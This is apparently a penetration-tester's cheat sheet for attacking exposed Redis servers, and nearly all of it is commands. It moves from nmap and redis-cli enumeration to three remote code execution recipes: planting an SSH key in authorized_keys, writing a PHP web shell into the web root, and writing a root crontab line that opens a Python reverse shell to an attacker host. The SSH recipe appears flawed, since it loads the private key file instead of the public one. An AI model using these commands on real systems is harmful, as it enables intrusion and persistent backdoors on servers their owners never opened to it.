# Redis enumeration and exploitation
   * [Initial enumeration](#initial-enumeration)
   * [Connecting to a Redis database](#connecting-to-a-redis-database)
   * [Enumerating a database](#enumerating-a-database)
   * [Writing data to a file](#writing-data-to-a-file)

## Initial enumeration
```bash
nmap -vv -p 6379 -sT --script=+redis* <ip>
```

## Connecting to a Redis database
```bash
redis-cli -h <ip> -p 6379 -a <password> # versions prior of Redis 6 
redis-cli -h <ip> -p 6379 --user default --pass <password>
```

## Enumerating a database
- Get database info:
```bash
INFO all
```
- Select a database
```bash
SELECT <database_0-15>
```
- List keys:
```bash
KEYS <pattern>
```
- Get value for a key:
```bash
GET <key>
```

## Writing data to a file
- SSH RCE:
```bash
ssh-keygen -t rsa -C "kali@<local_ip>" # File path = ./id_rsa
cat ./id_rsa | redis-cli -h <ip> -p 6379 -a <password> -x set somekey
redis-cli -h <ip> -p 6379 -a <password>

CONFIG SET rdbcompression no
CONFIG SET DIR /home/<username>/.ssh
CONFIG SET DBFILENAME authorized_keys
SAVE
```
- PHP RCE:
```bash
redis-cli -h <ip> -p 6379 -a <password>

SET somekey "\n\n               <?php system($_GET['c']);?>               \n\n"
CONFIG SET rdbcompression no
CONFIG SET DIR /var/www/html/
CONFIG SET DBFILENAME shell.php
SAVE
```
- Crontab python RCE:
```bash
redis-cli -h <ip> -p 6379 -a <password>

SET somekey "\n\n* * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<ip>\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"
CONFIG SET rdbcompression no
CONFIG SET DIR /var/spool/cron/crontabs/
CONFIG SET DBFILENAME root
SAVE
```
